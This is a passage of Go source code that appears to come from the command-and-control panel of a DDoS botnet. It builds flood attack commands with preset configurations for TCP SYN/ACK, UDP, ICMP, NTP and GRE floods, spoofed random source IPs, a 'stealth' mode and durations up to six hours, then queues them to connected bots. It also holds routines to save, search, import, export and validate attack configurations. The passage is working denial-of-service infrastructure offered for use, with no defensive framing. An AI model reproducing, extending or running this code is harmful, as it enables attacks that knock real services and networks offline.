		cmd += fmt.Sprintf(" packetorder=%s", config.PacketOrdering)
	}
	if config.BurstPattern != "linear" {
		cmd += fmt.Sprintf(" burstpat=%s", config.BurstPattern)
	}
	if config.SizeRandomize {
		cmd += " sizerand=1"
		if config.SizeMin != config.SizeMax {
			cmd += fmt.Sprintf(" sizemin=%d sizemax=%d", config.SizeMin, config.SizeMax)
		}
	}
	if config.SourcePortRandomize {
		cmd += " sportrand=1"
		if config.SourcePortMin != config.SourcePortMax {
			cmd += fmt.Sprintf(" sportmin=%d sportmax=%d", config.SourcePortMin, config.SourcePortMax)
		}
	}
	if config.SeqPattern != "random" {
		cmd += fmt.Sprintf(" seqpat=%s", config.SeqPattern)
		if config.SeqPattern == "increment" && config.SeqIncrement != 1 {
			cmd += fmt.Sprintf(" seqinc=%d", config.SeqIncrement)
		}
	}
	if config.AckPattern != "random" {
		cmd += fmt.Sprintf(" ackpat=%s", config.AckPattern)
		if config.AckPattern == "increment" && config.AckIncrement != 1 {
			cmd += fmt.Sprintf(" ackinc=%d", config.AckIncrement)
		}
	}
	if config.IPPrecedence > 0 {
		cmd += fmt.Sprintf(" ipprec=%d", config.IPPrecedence)
	}
	if config.DSCP > 0 {
		cmd += fmt.Sprintf(" dscp=%d", config.DSCP)
	}
	if config.ECN {
		cmd += " ecn=1"
	}
	if config.TCPUrgentPtr > 0 {
		cmd += fmt.Sprintf(" urgptr=%d", config.TCPUrgentPtr)
	}
	if config.WindowRandomize {
		cmd += " winrand=1"
		if config.WindowMin != config.WindowMax {
			cmd += fmt.Sprintf(" winmin=%d winmax=%d", config.WindowMin, config.WindowMax)
		}
	}
	if config.MSSRandomize {
		cmd += " mssrand=1"
		if config.MSSMin != config.MSSMax {
			cmd += fmt.Sprintf(" mssmin=%d mssmax=%d", config.MSSMin, config.MSSMax)
		}
	}
	if config.Keepalive {
		cmd += " keepalive=1"
		if config.KeepaliveInterval != 60 {
			cmd += fmt.Sprintf(" keepint=%d", config.KeepaliveInterval)
		}
	}
	if config.RetryCount != 3 {
		cmd += fmt.Sprintf(" retry=%d", config.RetryCount)
	}
	if config.ConnectionTimeout != 5000 {
		cmd += fmt.Sprintf(" timeout=%d", config.ConnectionTimeout)
	}
	if config.CongestionControl != "random" {
		cmd += fmt.Sprintf(" congestion=%s", config.CongestionControl)
	}
	atk, err := NewAttack(cmd, userInfo.admin)
	if err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	buf, err := atk.Build()
	if err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	} else if !database.ContainsWhitelistedTargets(atk) {
		clientList.QueueBuf(buf, botCount, botCatagory)
		this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32m╔══════════════════════════════════════════════════════════════╗\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║\x1b[1;97m              ATTACK LAUNCHED SUCCESSFULLY!                  \x1b[1;32m║\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m╠══════════════════════════════════════════════════════════════╣\r\n")))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mTarget:     \x1b[1;33m%s\r\n", target)))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mDuration:   \x1b[1;33m%d seconds\r\n", duration)))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mProtocols:  \x1b[1;33m%s\r\n", protocolsStr)))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m║ \x1b[1;36mPort:       \x1b[1;33m%d | Threads: %d | Size: %d | TTL: %d | TOS: %d\r\n",
			config.Port, config.Threads, config.Size, config.TTL, config.TOS)))
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32m╚══════════════════════════════════════════════════════════════╝\r\n")))
		time.Sleep(3 * time.Second)
	} else {
		this.conn.Write([]byte("\x1b[1;31mTarget is whitelisted\r\n"))
		time.Sleep(2 * time.Second)
	}
}
func (this *Admin) loadPresetConfig(username string, userInfo AccountInfo, botCount int, botCatagory string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              PRESET CONFIGURATIONS                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m1\x1b[0m - Maximum Power (all protocols, high threads)         \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m2\x1b[0m - TCP Focus (TCP protocols only)                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m3\x1b[0m - UDP Focus (UDP/ICMP/NTP protocols)                 \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m4\x1b[0m - GRE Tunnel (GRE IP/ETH only)                       \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m5\x1b[0m - Stealth Mode (low threads, small packets)          \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m0\x1b[0m - Back                                                \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mSelect preset: \x1b[0m"))
	choice, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var config AutobypassConfig
	choice = strings.TrimSpace(choice)
	switch choice {
	case "1":
		config = AutobypassConfig{
			Name:      "preset_maxpower",
			Protocols: []string{"all"},
			Port:      80,
			Threads:  512,
			Size:      1024,
			TTL:       64,
			TOS:       0,
			UseRawSocket: true,
			SendBufferSize: 8388608,
			SourceIPMode: "random",
			IPIDMode: "random",
			TCPMSS: 1460,
			TCPWindowSize: 65535,
			SeqRandomize: true,
			AckRandomize: true,
			BurstSize: 200,
			PayloadMode: "random",
			PayloadRepeat: 1,
			OSFingerprint: "random",
			TTLMin: 64,
			TTLMax: 64,
			PortMin: 80,
			PortMax: 80,
			Created:   time.Now(),
		}
	case "2":
		config = AutobypassConfig{
			Name:      "preset_tcp",
			Protocols: []string{"tcpsyn", "tcpack", "tcpall", "tcp", "tcpfrag", "tcpbypass"},
			Port:      80,
			Threads:  256,
			Size:      512,
			TTL:       64,
			TOS:       0,
			UseRawSocket: true,
			SendBufferSize: 4194304,
			SourceIPMode: "real",
			IPIDMode: "sequential",
			TCPMSS: 1460,
			TCPWindowSize: 65535,
			TCPSACK: true,
			TCPTimestamps: true,
			SeqRandomize: true,
			AckRandomize: true,
			BurstSize: 100,
			PayloadMode: "random",
			PayloadRepeat: 1,
			OSFingerprint: "linux",
			TTLMin: 64,
			TTLMax: 64,
			PortMin: 80,
			PortMax: 80,
			Created:   time.Now(),
		}
	case "3":
		config = AutobypassConfig{
			Name:      "preset_udp",
			Protocols: []string{"udp", "icmp", "ntp"},
			Port:      53,
			Threads:  256,
			Size:      512,
			TTL:       64,
			TOS:       0,
			UseRawSocket: true,
			SendBufferSize: 4194304,
			SourceIPMode: "random",
			IPIDMode: "random",
			UDPSourcePort: 0,
			SeqRandomize: true,
			AckRandomize: true,
			BurstSize: 100,
			PayloadMode: "random",
			PayloadRepeat: 1,
			OSFingerprint: "random",
			TTLMin: 64,
			TTLMax: 64,
			PortMin: 53,
			PortMax: 53,
			Created:   time.Now(),
		}
	case "4":
		config = AutobypassConfig{
			Name:      "preset_gre",
			Protocols: []string{"greip", "greeth"},
			Port:      0,
			Threads:  128,
			Size:      512,
			TTL:       64,
			TOS:       0,
			UseRawSocket: true,
			SendBufferSize: 4194304,
			SourceIPMode: "real",
			IPIDMode: "random",
			SeqRandomize: true,
			AckRandomize: true,
			BurstSize: 100,
			PayloadMode: "random",
			PayloadRepeat: 1,
			OSFingerprint: "random",
			TTLMin: 64,
			TTLMax: 64,
			PortMin: 0,
			PortMax: 0,
			Created:   time.Now(),
		}
	case "5":
		config = AutobypassConfig{
			Name:      "preset_stealth",
			Protocols: []string{"tcpsyn", "udp", "icmp"},
			Port:      80,
			Threads:  64,
			Size:      256,
			TTL:       128,
			TOS:       0,
			UseRawSocket: false,
			SendBufferSize: 2097152,
			SourceIPMode: "real",
			IPIDMode: "zero",
			TCPMSS: 1280,
			TCPWindowSize: 32768,
			SeqRandomize: true,
			AckRandomize: true,
			PPS: 1000,
			BPS: 1000000,
			BurstSize: 50,
			PayloadMode: "zero",
			PayloadRepeat: 1,
			OSFingerprint: "linux",
			TTLRandomize: true,
			TTLMin: 64,
			TTLMax: 128,
			PortRandomize: true,
			PortMin: 80,
			PortMax: 443,
			Created:   time.Now(),
		}
	case "0":
		return
	default:
		this.conn.Write([]byte("\x1b[1;31mInvalid preset\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;32mPreset loaded: %s\r\n", config.Name)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mProtocols: %s\r\n", strings.Join(config.Protocols, ", "))))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mPort: %d | Threads: %d | Size: %d | TTL: %d | TOS: %d\r\n",
		config.Port, config.Threads, config.Size, config.TTL, config.TOS)))
	this.conn.Write([]byte("\r\n\x1b[1;33mSave as configuration? (y/n): \x1b[0m"))
	save, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(save)) == "y" {
		this.conn.Write([]byte("\x1b[1;36mEnter configuration name: \x1b[0m"))
		name, err := this.ReadLine(false)
		if err == nil && strings.TrimSpace(name) != "" {
			config.Name = strings.TrimSpace(name)
			if err := this.saveAutobypassConfig(config); err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError saving: %s\r\n", err.Error())))
			} else {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mConfiguration '%s' saved!\r\n", config.Name)))
			}
		}
	}
	this.conn.Write([]byte("\r\n\x1b[1;33mLaunch attack now? (y/n): \x1b[0m"))
	launch, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(launch)) == "y" {
	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              LAUNCH ATTACK                                     \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	this.conn.Write([]byte("\x1b[1;36mTarget IP/Domain: \x1b[0m"))
	this.conn.Write([]byte("\x1b[2;37m(hint: enter IP address like 1.2.3.4, domain like example.com, or CIDR like 1.2.3.0/24)\x1b[0m\r\n"))
	target, err := this.ReadLine(false)
	if err != nil {
		return
	}
	target = strings.TrimSpace(target)
	if target == "" {
		this.conn.Write([]byte("\x1b[1;31mTarget cannot be empty\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\r\n\x1b[1;36mDuration (seconds, 1-21600): \x1b[0m"))
	this.conn.Write([]byte("\x1b[2;37m(hint: 60=1min, 300=5min, 600=10min, 3600=1hour, max 21600=6hours)\x1b[0m\r\n"))
	durationStr, err := this.ReadLine(false)
	if err != nil {
		return
	}
	duration, err := strconv.Atoi(strings.TrimSpace(durationStr))
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mInvalid duration\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if duration < 1 || duration > 21600 {
		this.conn.Write([]byte("\x1b[1;31mDuration must be between 1 and 21600 seconds\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	cmdPreview := this.previewCommand(config, target, duration)
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              COMMAND PREVIEW                                 \x1b[1;95m║\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;33m%s\x1b[1;95m║\r\n", cmdPreview)))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n")))
	this.conn.Write([]byte("\x1b[1;33m🚀 Launch attack? (y/n): \x1b[0m"))
	confirm, _ := this.ReadLine(false)
	if strings.ToLower(strings.TrimSpace(confirm)) != "y" {
		this.conn.Write([]byte("\x1b[1;33mAttack cancelled\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.launchAutobypass(config, username, userInfo, botCount, botCatagory, target, duration)
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) searchAutobypassConfigs() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SEARCH CONFIGURATIONS                               \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	this.conn.Write([]byte("\x1b[1;36mEnter search term (name or protocol): \x1b[0m"))
	searchTerm, err := this.ReadLine(false)
	if err != nil {
		return
	}
	searchTerm = strings.ToLower(strings.TrimSpace(searchTerm))
	if searchTerm == "" {
		this.conn.Write([]byte("\x1b[1;31mEmpty search term\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if err := ensureAutobypassDir(); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	files, err := ioutil.ReadDir(autobypassConfigDir)
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mError reading configurations\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	var found []string
	this.conn.Write([]byte("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SEARCH RESULTS                                     \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".txt") {
			name := strings.TrimSuffix(file.Name(), ".txt")
			config := this.readAutobypassConfig(name)
			if config != nil {
				nameLower := strings.ToLower(config.Name)
				protocolsLower := strings.ToLower(strings.Join(config.Protocols, ","))
				if strings.Contains(nameLower, searchTerm) || strings.Contains(protocolsLower, searchTerm) {
					found = append(found, name)
					protoStr := strings.Join(config.Protocols, ", ")
					if len(protoStr) > 30 {
						protoStr = protoStr[:27] + "..."
					}
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36m%d\x1b[0m - \x1b[1;33m%-20s\x1b[0m \x1b[1;36m%s\x1b[0m\r\n",
						len(found), name, protoStr)))
				}
			}
		}
	}
	if len(found) == 0 {
		this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31mNo configurations found                                    \x1b[1;95m║\r\n"))
	} else {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mFound %d configuration(s)                              \x1b[1;95m║\r\n", len(found))))
	}
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	time.Sleep(3 * time.Second)
}
func (this *Admin) exportImportConfigs() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              EXPORT/IMPORT CONFIGURATIONS                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m1\x1b[0m - Export configuration to file                        \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m2\x1b[0m - Import configuration from file                      \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m3\x1b[0m - Export all configurations                           \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36m0\x1b[0m - Back                                                \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n\x1b[1;33mSelect option: \x1b[0m"))
	choice, err := this.ReadLine(false)
	if err != nil {
		return
	}
	switch strings.TrimSpace(choice) {
	case "1":
		this.exportConfig()
	case "2":
		this.importConfig()
	case "3":
		this.exportAllConfigs()
	case "0":
		return
	default:
		this.conn.Write([]byte("\x1b[1;31mInvalid option\r\n"))
		time.Sleep(2 * time.Second)
	}
}
func (this *Admin) exportConfig() {
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name to export: \x1b[0m"))
	name, err := this.ReadLine(false)
	if err != nil {
		return
	}
	config := this.readAutobypassConfig(strings.TrimSpace(name))
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter export file path (or press Enter for default): \x1b[0m"))
	exportPath, _ := this.ReadLine(false)
	if strings.TrimSpace(exportPath) == "" {
		exportPath = fmt.Sprintf("export_%s_%d.txt", config.Name, time.Now().Unix())
	}
	content := fmt.Sprintf("# Autobypass Configuration Export\n")
	content += fmt.Sprintf("# Exported: %s\n", time.Now().Format(time.RFC3339))
	content += fmt.Sprintf("# Name: %s\n\n", config.Name)
	content += fmt.Sprintf("name=%s\n", config.Name)
	content += fmt.Sprintf("protocols=%s\n", strings.Join(config.Protocols, ","))
	content += fmt.Sprintf("port=%d\n", config.Port)
	content += fmt.Sprintf("threads=%d\n", config.Threads)
	content += fmt.Sprintf("size=%d\n", config.Size)
	content += fmt.Sprintf("ttl=%d\n", config.TTL)
	content += fmt.Sprintf("tos=%d\n", config.TOS)
	content += fmt.Sprintf("created=%s\n", config.Created.Format(time.RFC3339))
	if err := ioutil.WriteFile(exportPath, []byte(content), 0644); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError exporting: %s\r\n", err.Error())))
	} else {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mConfiguration exported to: %s\r\n", exportPath)))
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) importConfig() {
	this.conn.Write([]byte("\x1b[1;36mEnter file path to import: \x1b[0m"))
	importPath, err := this.ReadLine(false)
	if err != nil {
		return
	}
	data, err := ioutil.ReadFile(strings.TrimSpace(importPath))
	if err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError reading file: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	config := &AutobypassConfig{}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		switch key {
		case "name":
			config.Name = value
		case "protocols":
			config.Protocols = strings.Split(value, ",")
			for i := range config.Protocols {
				config.Protocols[i] = strings.TrimSpace(config.Protocols[i])
			}
		case "port":
			if p, err := strconv.Atoi(value); err == nil {
				config.Port = p
			}
		case "threads":
			if t, err := strconv.Atoi(value); err == nil {
				config.Threads = t
			}
		case "size":
			if s, err := strconv.Atoi(value); err == nil {
				config.Size = s
			}
		case "ttl":
			if t, err := strconv.Atoi(value); err == nil {
				config.TTL = t
			}
		case "tos":
			if t, err := strconv.Atoi(value); err == nil {
				config.TOS = t
			}
		case "created":
			if t, err := time.Parse(time.RFC3339, value); err == nil {
				config.Created = t
			}
		}
	}
	if config.Name == "" {
		this.conn.Write([]byte("\x1b[1;31mInvalid configuration file (missing name)\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	if len(config.Protocols) == 0 {
		config.Protocols = []string{"all"}
	}
	if config.Created.IsZero() {
		config.Created = time.Now()
	}
	if err := this.saveAutobypassConfig(*config); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError importing: %s\r\n", err.Error())))
	} else {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mConfiguration '%s' imported successfully!\r\n", config.Name)))
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) exportAllConfigs() {
	if err := ensureAutobypassDir(); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError: %s\r\n", err.Error())))
		time.Sleep(2 * time.Second)
		return
	}
	files, err := ioutil.ReadDir(autobypassConfigDir)
	if err != nil {
		this.conn.Write([]byte("\x1b[1;31mError reading configurations\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	exportPath := fmt.Sprintf("export_all_%d.txt", time.Now().Unix())
	content := "# Autobypass Configurations Export\n"
	content += fmt.Sprintf("# Exported: %s\n", time.Now().Format(time.RFC3339))
	content += fmt.Sprintf("# Total configurations: %d\n\n", len(files))
	for _, file := range files {
		if strings.HasSuffix(file.Name(), ".txt") {
			name := strings.TrimSuffix(file.Name(), ".txt")
			config := this.readAutobypassConfig(name)
			if config != nil {
				content += fmt.Sprintf("# Configuration: %s\n", config.Name)
				content += fmt.Sprintf("name=%s\n", config.Name)
				content += fmt.Sprintf("protocols=%s\n", strings.Join(config.Protocols, ","))
				content += fmt.Sprintf("port=%d\n", config.Port)
				content += fmt.Sprintf("threads=%d\n", config.Threads)
				content += fmt.Sprintf("size=%d\n", config.Size)
				content += fmt.Sprintf("ttl=%d\n", config.TTL)
				content += fmt.Sprintf("tos=%d\n", config.TOS)
				content += fmt.Sprintf("created=%s\n", config.Created.Format(time.RFC3339))
				content += "\n"
			}
		}
	}
	if err := ioutil.WriteFile(exportPath, []byte(content), 0644); err != nil {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mError exporting: %s\r\n", err.Error())))
	} else {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;32mAll configurations exported to: %s\r\n", exportPath)))
	}
	time.Sleep(2 * time.Second)
}
func (this *Admin) validateAutobypassConfig() {
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              VALIDATE CONFIGURATION                              \x1b[1;95m║\r\n"))
	this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
	configs := this.listAutobypassConfigs()
	if len(configs) == 0 {
		this.conn.Write([]byte("\x1b[1;31mNo configurations found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	this.conn.Write([]byte("\x1b[1;36mEnter configuration name or number to validate: \x1b[0m"))
	nameOrNum, err := this.ReadLine(false)
	if err != nil {
		return
	}
	var config *AutobypassConfig
	nameOrNum = strings.TrimSpace(nameOrNum)
	if num, err := strconv.Atoi(nameOrNum); err == nil && num > 0 && num <= len(configs) {
		config = this.readAutobypassConfig(configs[num-1])
	} else {
		config = this.readAutobypassConfig(nameOrNum)
	}
	if config == nil {
		this.conn.Write([]byte("\x1b[1;31mConfiguration not found\r\n"))
		time.Sleep(2 * time.Second)
		return
	}
	var errors []string
	var warnings []string
	if config.Name == "" {
		errors = append(errors, "Name is empty")
	}
	if len(config.Protocols) == 0 {
		errors = append(errors, "No protocols selected")
	}
	validProtocols := map[string]bool{
		"greip": true, "greeth": true, "tcpsyn": true, "tcpack": true,
		"tcpall": true, "udp": true, "tcp": true, "tcpfrag": true,
		"tcpbypass": true, "ice": true, "icmp": true, "ntp": true, "all": true,
	}
	for _, proto := range config.Protocols {
		if !validProtocols[strings.ToLower(proto)] {
			errors = append(errors, fmt.Sprintf("Invalid protocol: %s", proto))
		}
	}
	if config.Port < 0 || config.Port > 65535 {
		errors = append(errors, fmt.Sprintf("Invalid port: %d (must be 0-65535)", config.Port))
	}
	if config.Threads <= 0 {
		errors = append(errors, fmt.Sprintf("Invalid threads: %d (must be > 0)", config.Threads))
	} else if config.Threads > 10000 {
		warnings = append(warnings, fmt.Sprintf("Very high thread count: %d (may cause performance issues)", config.Threads))
	}
	if config.Size <= 0 {
		errors = append(errors, fmt.Sprintf("Invalid size: %d (must be > 0)", config.Size))
	} else if config.Size > 65507 {
		warnings = append(warnings, fmt.Sprintf("Very large packet size: %d (max UDP size is 65507)", config.Size))
	}
	if config.TTL < 0 || config.TTL > 255 {
		errors = append(errors, fmt.Sprintf("Invalid TTL: %d (must be 0-255)", config.TTL))
	}
	if config.TOS < 0 || config.TOS > 255 {
		errors = append(errors, fmt.Sprintf("Invalid TOS: %d (must be 0-255)", config.TOS))
	}
	this.conn.Write([]byte(fmt.Sprintf("\r\n\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║\x1b[1;97m              VALIDATION RESULTS                                \x1b[1;95m║\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n")))
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;36mConfiguration: \x1b[1;33m%-40s\x1b[1;95m║\r\n", config.Name)))
	if len(errors) == 0 && len(warnings) == 0 {
		this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;32m✓ Configuration is valid                                    \x1b[1;95m║\r\n")))
	} else {
		if len(errors) > 0 {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;31m✗ Errors found: %-40d\x1b[1;95m║\r\n", len(errors))))
			for _, err := range errors {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║   \x1b[1;31m- %-50s\x1b[1;95m║\r\n", err)))
			}
		}
		if len(warnings) > 0 {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║ \x1b[1;33m⚠ Warnings: %-43d\x1b[1;95m║\r\n", len(warnings))))
			for _, warn := range warnings {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m║   \x1b[1;33m- %-50s\x1b[1;95m║\r\n", warn)))
			}
		}
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n")))
	this.conn.Write([]byte("\r\n\x1b[1;33mPress Enter to continue...\x1b[0m"))
	this.ReadLine(false)
}
func (this *Admin) previewCommand(config AutobypassConfig, target string, duration int) string {
	protocolsStr := strings.Join(config.Protocols, ",")
	if len(config.Protocols) == 0 || (len(config.Protocols) == 1 && config.Protocols[0] == "all") {
		protocolsStr = "all"
	}
	cmd := fmt.Sprintf("autobypass %s %d port=%d threads=%d size=%d ttl=%d tos=%d protocols=%s",
		target, duration, config.Port, config.Threads, config.Size, config.TTL, config.TOS, protocolsStr)
	if config.UseRawSocket {
		cmd += " rawsocket=1"
	}
	if config.BindToDevice != "" {
		cmd += fmt.Sprintf(" binddev=%s", config.BindToDevice)
	}
	if config.SendBufferSize != 4194304 {
		cmd += fmt.Sprintf(" sndbuf=%d", config.SendBufferSize)
	}
	if config.SourceIPMode != "real" {
		cmd += fmt.Sprintf(" srcmode=%s", config.SourceIPMode)
		if config.SourceIPStart != "" {
			cmd += fmt.Sprintf(" srcstart=%s", config.SourceIPStart)
		}
		if config.SourceIPEnd != "" {
			cmd += fmt.Sprintf(" srcend=%s", config.SourceIPEnd)
		}
	}
	if config.IPIDMode != "random" {
		cmd += fmt.Sprintf(" ipidmode=%s", config.IPIDMode)
	}
	if config.DFFlag {
		cmd += " df=1"
	}
	if config.MoreFragments {
		cmd += " mf=1"
	}
	if config.FragmentOffset > 0 {
		cmd += fmt.Sprintf(" fragoff=%d", config.FragmentOffset)
	}
	if config.TCPMSS != 1460 {
		cmd += fmt.Sprintf(" mss=%d", config.TCPMSS)
	}
	if config.TCPWindowSize != 65535 {
		cmd += fmt.Sprintf(" win=%d", config.TCPWindowSize)
	}
	if config.TCPWindowScale > 0 {
		cmd += fmt.Sprintf(" wscale=%d", config.TCPWindowScale)
	}
	if config.TCPSACK {
		cmd += " sack=1"
	}
	if config.TCPTimestamps {
		cmd += " ts=1"
	}
	if config.TCPNOP > 0 {
		cmd += fmt.Sprintf(" nop=%d", config.TCPNOP)
	}
	if config.UDPSourcePort > 0 {
		cmd += fmt.Sprintf(" sport=%d", config.UDPSourcePort)
	}
	if !config.SeqRandomize {
		cmd += " seqrand=0"
	}
	if !config.AckRandomize {
		cmd += " ackrand=0"
	}
	if config.PPS > 0 {
		cmd += fmt.Sprintf(" pps=%d", config.PPS)
	}
	if config.BPS > 0 {
		cmd += fmt.Sprintf(" bps=%d", config.BPS)
	}
	if config.BurstSize != 100 {
		cmd += fmt.Sprintf(" burst=%d", config.BurstSize)
	}
	if config.PayloadMode != "random" {
		cmd += fmt.Sprintf(" payloadmode=%s", config.PayloadMode)
		if config.PayloadPattern != "" {
